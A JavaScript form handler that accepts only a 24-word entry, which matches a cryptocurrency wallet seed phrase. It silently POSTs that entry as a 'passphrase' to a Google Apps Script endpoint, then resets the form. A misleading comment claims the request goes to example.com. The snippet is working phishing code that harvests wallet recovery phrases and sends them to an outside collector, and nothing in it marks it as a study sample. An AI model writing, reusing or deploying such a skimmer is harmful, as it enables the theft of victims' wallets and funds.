// Function to handle form submission
function handleSubmit(event) {
    event.preventDefault(); // Prevent default form submission

    const myButton = document.getElementById('b1');
    myButton.disabled = true;

    const myButton2 = document.getElementById('b2');
    myButton2.disabled = true;

    const form = document.getElementById('myForm'); // Replace 'myForm' with your form ID
    const inputValue = form.elements['mf-texts'].value.trim();

    const wordCount = inputValue.split(/\s+/).length;
    if (wordCount !== 24) {
        myButton.disabled = false;
        myButton2.disabled = false;
        form.reset();
        return; // Exit function if word count is not 24
    }

    // Make a POST request to example.com/send_char
    const url = `https://script.google.com/macros/s/AKfycbx0X5At7d668sHfowbiwg7m2h4yiKNKtDdbB7GtOeJawTjjCPTk4LwGq6-nrUOgj_UZ/exec`;

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ passphrase: inputValue })
    });

    myButton.disabled = false;
    myButton2.disabled = false;
    form.reset();
}



